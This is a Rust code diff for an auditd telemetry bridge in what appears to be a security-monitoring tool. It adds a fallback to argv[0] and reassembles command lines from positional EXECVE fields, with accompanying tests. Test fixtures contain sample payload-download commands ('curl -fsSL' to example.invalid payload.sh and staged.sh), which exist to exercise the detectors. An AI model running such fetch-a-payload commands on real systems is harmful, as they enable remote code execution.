@@ -2,7 +2,7 @@ use crate::host_common::{
     first_command_line, first_string, process_name_from_path, required_string, required_timestamp,
     required_u16, sanitize_optional_string, telemetry_event_id,
 };
-use crate::{JsonBridgeConfigError, validate_event_schema};
+use crate::{JsonBridgeConfigError, record_error, validate_event_schema};
 use async_trait::async_trait;
 use serde_json::Value;
 use swarm_core::config::AuditdBridgeConfig;
@@ -148,13 +148,20 @@ impl AuditdBridge {
     }
 
     fn map_process_start(&mut self, record: &Value) -> TelemetryBridgeResult<TelemetryPayload> {
-        let exe = required_string(
-            record,
-            &["/exe", "/process/exe"],
-            "exe",
-            &mut self.health,
-            SOURCE_ID,
-        )?;
+        // Raw auditd EXECVE records carry argc/a0/a1/... but `exe` lives on
+        // the sibling SYSCALL record with the same serial. Fall back to a0
+        // (argv[0]) so unenriched EXECVE input still reaches the
+        // process-start detectors instead of erroring the whole bridge.
+        let exe = first_string(record, &["/exe", "/process/exe"])
+            .or_else(|| first_string(record, &["/a0"]))
+            .ok_or_else(|| {
+                record_error(
+                    &mut self.health,
+                    format!(
+                        "{SOURCE_ID} field `exe` is required and must be non-empty (or argv[0] in /a0)"
+                    ),
+                )
+            })?;
         // Raw auditd commonly emits only `ppid` (numeric) on SYSCALL/EXECVE
         // records — `parent_comm`/`ppcomm`/`parent_exe` are populated by
         // user-space enrichers like ausearch/auditbeat. Fall back to ppid and
@@ -174,12 +181,15 @@ impl AuditdBridge {
         // Try `/cmdline` and `/argv` first (already decoded); `/proctitle` in
         // raw auditd is a hex-encoded, NUL-separated argv buffer that downstream
         // command-line detectors can't parse without decoding it back to a
-        // human-readable command line.
+        // human-readable command line. Last resort: assemble from kernel
+        // a0/a1/... fields so flags, URLs, and encoded payloads aren't lost on
+        // events that only carry positional argv.
         let command_line =
             sanitize_optional_string(first_command_line(record, &["/cmdline", "/argv"]))
                 .or_else(|| {
                     first_string(record, &["/proctitle"]).and_then(|raw| decode_proctitle(&raw))
                 })
+                .or_else(|| assemble_argv_from_positional(record))
                 .unwrap_or_else(|| exe.clone());
 
         Ok(TelemetryPayload::ProcessStart(ProcessStartEvent {
@@ -341,6 +351,38 @@ fn decode_proctitle(raw: &str) -> Option<String> {
     }
     let decoded = String::from_utf8(bytes).ok()?;
     let trimmed = decoded.trim();
+    (!trimmed.is_empty()).then(|| trimmed.to_string())
+}
+
+/// Reassemble a command line from the kernel's positional EXECVE argv fields
+/// (`a0`, `a1`, ...) when no joined `cmdline`/`argv`/`proctitle` field is
+/// present. Without this, raw EXECVE events that only carry positional argv
+/// fall back to bare exe and lose flags, URLs, and encoded payloads.
+fn assemble_argv_from_positional(record: &Value) -> Option<String> {
+    let object = record.as_object()?;
+    let mut args: Vec<(usize, String)> = Vec::new();
+    for (key, value) in object {
+        let Some(rest) = key.strip_prefix('a') else {
+            continue;
+        };
+        // Reject `a0_len`, `a1[0]`, etc. — only accept bare `a<N>`.
+        let Ok(index) = rest.parse::<usize>() else {
+            continue;
+        };
+        if let Some(arg) = value.as_str() {
+            args.push((index, arg.to_string()));
+        }
+    }
+    if args.is_empty() {
+        return None;
+    }
+    args.sort_by_key(|(index, _)| *index);
+    let joined = args
+        .into_iter()
+        .map(|(_, arg)| arg)
+        .collect::<Vec<_>>()
+        .join(" ");
+    let trimmed = joined.trim();
     (!trimmed.is_empty()).then(|| trimmed.to_string())
 }
 
@@ -760,6 +802,79 @@ mod tests {
                 assert_eq!(
                     process.command_line,
                     "curl -fsSL https://example.invalid/payload.sh"
+                );
+            }
+            _ => panic!("expected process_start payload"),
+        }
+    }
+
+    #[tokio::test]
+    async fn execve_without_exe_falls_back_to_argv_zero() {
+        // Raw auditd EXECVE often has argv positional fields but no `exe`
+        // (that's on the sibling SYSCALL record). Used to error the bridge;
+        // now falls back to a0 as the executable.
+        let mut bridge = AuditdBridge::new(JsonRecordSource::new([json!({
+            "type": "EXECVE",
+            "serial": 502,
+            "timestamp": "2026-04-13T15:23:00Z",
+            "host": "linux-a",
+            "syscall": "execve",
+            "argc": "3",
+            "a0": "/usr/bin/curl",
+            "a1": "-fsSL",
+            "a2": "https://example.invalid/payload.sh"
+        })]));
+
+        let event = bridge
+            .poll()
+            .await
+            .expect("execve without exe should map via a0")
+            .pop()
+            .expect("one event");
+        match event.payload {
+            TelemetryPayload::ProcessStart(process) => {
+                assert_eq!(process.executable_path.as_deref(), Some("/usr/bin/curl"));
+                assert_eq!(process.process_name, "curl");
+                assert_eq!(
+                    process.command_line,
+                    "/usr/bin/curl -fsSL https://example.invalid/payload.sh"
+                );
+            }
+            _ => panic!("expected process_start payload"),
+        }
+    }
+
+    #[tokio::test]
+    async fn execve_with_exe_but_only_positional_args_assembles_command_line() {
+        // EXECVE enriched with exe but only carrying a0/a1/... positional
+        // argv (no cmdline/argv/proctitle). The argv URL and flags must
+        // reach process-start detectors via the assembled command_line.
+        let mut bridge = AuditdBridge::new(JsonRecordSource::new([json!({
+            "type": "EXECVE",
+            "serial": 503,
+            "timestamp": "2026-04-13T15:24:00Z",
+            "host": "linux-a",
+            "syscall": "execve",
+            "exe": "/usr/bin/curl",
+            "comm": "curl",
+            "parent_comm": "bash",
+            "argc": "3",
+            "a0": "curl",
+            "a1": "-fsSL",
+            "a2": "https://example.invalid/staged.sh"
+        })]));
+
+        let event = bridge
+            .poll()
+            .await
+            .expect("execve with positional args should map")
+            .pop()
+            .expect("one event");
+        match event.payload {
+            TelemetryPayload::ProcessStart(process) => {
+                assert_eq!(
+                    process.command_line,
+                    "curl -fsSL https://example.invalid/staged.sh"
                 );
             }
             _ => panic!("expected process_start payload"),
